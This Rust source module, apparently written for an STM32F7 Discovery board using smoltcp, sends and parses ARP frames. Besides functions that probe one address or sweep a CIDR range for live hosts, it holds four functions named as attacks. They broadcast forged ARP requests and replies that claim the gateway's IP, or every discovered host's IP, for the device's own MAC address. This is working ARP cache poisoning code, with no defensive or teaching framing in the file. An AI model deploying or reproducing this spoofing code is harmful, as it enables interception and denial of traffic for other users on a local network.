use super::cidr;
use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use smoltcp::iface::EthernetInterface;
use smoltcp::phy::{Device, RxToken};
use smoltcp::time::Instant;
use smoltcp::wire::*;
use stm32f7_discovery::{ethernet::EthernetDevice, system_clock};

use super::eth::dispatch_ethernet;

// #[derive(Debug, PartialEq, Eq, PartialOrd, Ord)]
// pub struct ArpResponse(pub Ipv4Address, pub EthernetAddress);

pub type ArpResponses = BTreeMap<Ipv4Address, EthernetAddress>;

impl super::StringableVec for ArpResponses {
    fn to_string_vec(&self) -> Vec<String> {
        let mut ret: Vec<String> = Vec::new();
        for i in self.iter() {
            ret.push(format!("{} ({})", i.0, i.1));
        }
        ret
    }
}

/// Send an ARP request to check whether addr is currently being used on the current network
pub fn request(
    iface: &mut EthernetDevice,
    eth_addr: EthernetAddress,
    addr: Ipv4Address,
) -> Result<bool, String> {
    let arp_req = ArpRepr::EthernetIpv4 {
        operation: ArpOperation::Request,
        source_hardware_addr: eth_addr,
        source_protocol_addr: Ipv4Address::new(0, 0, 0, 0),
        target_hardware_addr: EthernetAddress::BROADCAST,
        target_protocol_addr: addr,
    };

    let mut buffer = vec![0; arp_req.buffer_len()];
    let mut packet = ArpPacket::new_unchecked(&mut buffer);
    arp_req.emit(&mut packet);

    let tx_token = match iface.transmit() {
        Some(x) => x,
        None => return Err(String::from("No tx descriptor available")),
    };
    match dispatch_ethernet(
        eth_addr,
        tx_token,
        Instant::from_millis(system_clock::ms() as i64),
        arp_req.buffer_len(),
        |mut frame| {
            frame.set_dst_addr(EthernetAddress::BROADCAST);
            frame.set_ethertype(EthernetProtocol::Arp);

            let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
            arp_req.emit(&mut packet);
        },
    ) {
        Ok(_) => {}
        Err(x) => return Err(x.to_string()),
    };
    let mut tries = 0;
    loop {
        let (rx_token, _) = match iface.receive() {
            None => {
                if tries > 100 {
                    break;
                }
                tries += 1;
                continue;
            }
            Some(tokens) => tokens,
        };
        match rx_token.consume(Instant::from_millis(system_clock::ms() as i64), |frame| {
            process_arp(eth_addr, &frame)
        }) {
            Ok(ArpRepr::EthernetIpv4 { .. }) => return Ok(false),
            Ok(_) => {}
            Err(::smoltcp::Error::Unrecognized) => {}
            Err(_) => {}
        };
    }
    Ok(true)
}

/// Scan all addrs in cidr and return those for which somebody responded
pub fn get_neighbors_v4(
    iface: &mut EthernetDevice,
    eth_addr: EthernetAddress,
    cidr: &mut cidr::Ipv4Cidr,
) -> Result<ArpResponses, String> {
    // let mut found_addrs = Vec::<ArpResponse>::new();
    // let mut found_addrs = BTreeSet::<ArpResponse>::new();
    let mut found_addrs = ArpResponses::new();
    let mut arp_req = ArpRepr::EthernetIpv4 {
        operation: ArpOperation::Request,
        source_hardware_addr: eth_addr,
        source_protocol_addr: Ipv4Address::new(0, 0, 0, 0),
        target_hardware_addr: EthernetAddress::BROADCAST,
        target_protocol_addr: Ipv4Address::new(0, 0, 0, 0),
    };
    cidr.reset();
    for addr in cidr {
        if let ArpRepr::EthernetIpv4 {
            target_protocol_addr: ref mut y,
            ..
        } = arp_req
        {
            *y = cidr::to_ipv4_address(addr);
        }
        let mut buffer = vec![0; arp_req.buffer_len()];
        let mut packet = ArpPacket::new_unchecked(&mut buffer);
        arp_req.emit(&mut packet);

        let tx_token = match iface.transmit() {
            Some(x) => x,
            None => return Err(String::from("No tx descriptor available")),
        };
        match dispatch_ethernet(
            eth_addr,
            tx_token,
            Instant::from_millis(system_clock::ms() as i64),
            arp_req.buffer_len(),
            |mut frame| {
                frame.set_dst_addr(EthernetAddress::BROADCAST);
                frame.set_ethertype(EthernetProtocol::Arp);

                let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
                arp_req.emit(&mut packet);
            },
        ) {
            Ok(x) => x,
            Err(x) => return Err(x.to_string()),
        }
    }
    let mut tries = 0;
    loop {
        let (rx_token, _) = match iface.receive() {
            None => {
                if tries > 100 {
                    break;
                }
                tries += 1;
                continue;
            }
            Some(tokens) => tokens,
        };
        match rx_token.consume(Instant::from_millis(system_clock::ms() as i64), |frame| {
            process_arp(eth_addr, &frame)
        }) {
            Ok(ArpRepr::EthernetIpv4 {
                source_hardware_addr,
                source_protocol_addr,
                ..
            }) => {
                found_addrs.insert(source_protocol_addr, source_hardware_addr);
            }
            Ok(_) => {}
            Err(::smoltcp::Error::Unrecognized) => {}
            Err(_) => {}
        };
    }
    Ok(found_addrs)
}

pub fn attack_gateway_v4_request<'b, 'c, 'e, DeviceT>(
    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
    eth_addr: EthernetAddress,
    gateway: Ipv4Address,
) where
    DeviceT: for<'d> Device<'d>,
{
    let arp_reqest = ArpRepr::EthernetIpv4 {
        operation: ArpOperation::Request,
        source_hardware_addr: eth_addr,
        source_protocol_addr: gateway,
        target_hardware_addr: EthernetAddress([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
        target_protocol_addr: gateway,
    };

    let mut buffer = vec![0; arp_reqest.buffer_len()];
    let mut packet = ArpPacket::new_unchecked(&mut buffer);
    arp_reqest.emit(&mut packet);

    let tx_token = match iface.device.transmit() {
        Some(x) => x,
        None => return, // TODO "No tx descriptor available"
    };

    dispatch_ethernet(
        eth_addr,
        tx_token,
        Instant::from_millis(system_clock::ms() as i64),
        arp_reqest.buffer_len(),
        |mut frame| {
            frame.set_dst_addr(EthernetAddress::BROADCAST);
            frame.set_ethertype(EthernetProtocol::Arp);

            let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
            arp_reqest.emit(&mut packet);
        },
    )
    .unwrap_or(());
}

pub fn attack_network_v4_request<'b, 'c, 'e, DeviceT>(
    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
    eth_addr: EthernetAddress,
    addrs: &ArpResponses,
) where
    DeviceT: for<'d> Device<'d>,
{
    for addr in addrs {
        let arp_reqest = ArpRepr::EthernetIpv4 {
            operation: ArpOperation::Request,
            source_hardware_addr: eth_addr,
            source_protocol_addr: *addr.0,
            target_hardware_addr: EthernetAddress([0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            target_protocol_addr: *addr.0,
        };

        let mut buffer = vec![0; arp_reqest.buffer_len()];
        let mut packet = ArpPacket::new_unchecked(&mut buffer);
        arp_reqest.emit(&mut packet);

        let tx_token = match iface.device.transmit() {
            Some(x) => x,
            None => return, // TODO "No tx descriptor available"
        };

        dispatch_ethernet(
            eth_addr,
            tx_token,
            Instant::from_millis(system_clock::ms() as i64),
            arp_reqest.buffer_len(),
            |mut frame| {
                frame.set_dst_addr(EthernetAddress::BROADCAST);
                frame.set_ethertype(EthernetProtocol::Arp);

                let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
                arp_reqest.emit(&mut packet);
            },
        )
        .unwrap_or(());
    }
}

pub fn attack_gateway_v4_reply<'b, 'c, 'e, DeviceT>(
    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
    eth_addr: EthernetAddress,
    gateway: Ipv4Address,
) where
    DeviceT: for<'d> Device<'d>,
{
    let arp_reply = ArpRepr::EthernetIpv4 {
        operation: ArpOperation::Reply,
        source_hardware_addr: eth_addr,
        source_protocol_addr: gateway,
        target_hardware_addr: eth_addr,
        target_protocol_addr: gateway,
    };

    let mut buffer = vec![0; arp_reply.buffer_len()];
    let mut packet = ArpPacket::new_unchecked(&mut buffer);
    arp_reply.emit(&mut packet);

    let tx_token = match iface.device.transmit() {
        Some(x) => x,
        None => return, // TODO "No tx descriptor available"
    };

    dispatch_ethernet(
        eth_addr,
        tx_token,
        Instant::from_millis(system_clock::ms() as i64),
        arp_reply.buffer_len(),
        |mut frame| {
            frame.set_dst_addr(EthernetAddress::BROADCAST);
            frame.set_ethertype(EthernetProtocol::Arp);

            let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
            arp_reply.emit(&mut packet);
        },
    )
    .unwrap_or(());
}

pub fn attack_network_v4_reply<'b, 'c, 'e, DeviceT>(
    iface: &mut EthernetInterface<'b, 'c, 'e, DeviceT>,
    eth_addr: EthernetAddress,
    addrs: &ArpResponses,
) where
    DeviceT: for<'d> Device<'d>,
{
    for addr in addrs {
        let arp_reply = ArpRepr::EthernetIpv4 {
            operation: ArpOperation::Reply,
            source_hardware_addr: eth_addr,
            source_protocol_addr: *addr.0,
            target_hardware_addr: eth_addr,
            target_protocol_addr: *addr.0,
        };

        let mut buffer = vec![0; arp_reply.buffer_len()];
        let mut packet = ArpPacket::new_unchecked(&mut buffer);
        arp_reply.emit(&mut packet);

        let tx_token = match iface.device.transmit() {
            Some(x) => x,
            None => return, // TODO "No tx descriptor available"
        };

        dispatch_ethernet(
            eth_addr,
            tx_token,
            Instant::from_millis(system_clock::ms() as i64),
            arp_reply.buffer_len(),
            |mut frame| {
                frame.set_dst_addr(EthernetAddress::BROADCAST);
                frame.set_ethertype(EthernetProtocol::Arp);

                let mut packet = ArpPacket::new_unchecked(frame.payload_mut());
                arp_reply.emit(&mut packet);
            },
        )
        .unwrap_or(());
    }
}

/// Parse ARP frame and check if it is a response to one of our requests
/// Returns parsed arp representation if it is
fn process_arp<T: AsRef<[u8]>>(
    eth_addr: EthernetAddress,
    frame: &T,
) -> Result<ArpRepr, smoltcp::Error> {
    let eth_frame = EthernetFrame::new_checked(frame)?;

    // Ignore any packets not directed to our hardware address or any of the multicast groups.
    if !eth_frame.dst_addr().is_broadcast()
        && !eth_frame.dst_addr().is_multicast()
        && eth_frame.dst_addr() != eth_addr
    {
        return Err(smoltcp::Error::Dropped);
    }

    match eth_frame.ethertype() {
        EthernetProtocol::Arp => {
            let arp_packet = ArpPacket::new_checked(eth_frame.payload())?;
            let arp_repr = ArpRepr::parse(&arp_packet)?;

            match arp_repr {
                ArpRepr::EthernetIpv4 {
                    source_hardware_addr,
                    source_protocol_addr,
                    ..
                } => {
                    if source_protocol_addr.is_unicast() && source_hardware_addr.is_unicast() {
                        Ok(arp_repr)
                    } else {
                        Err(smoltcp::Error::Dropped)
                    }
                }
                _ => Err(smoltcp::Error::Unrecognized),
            }
        }
        _ => Err(smoltcp::Error::Unrecognized),
    }
}
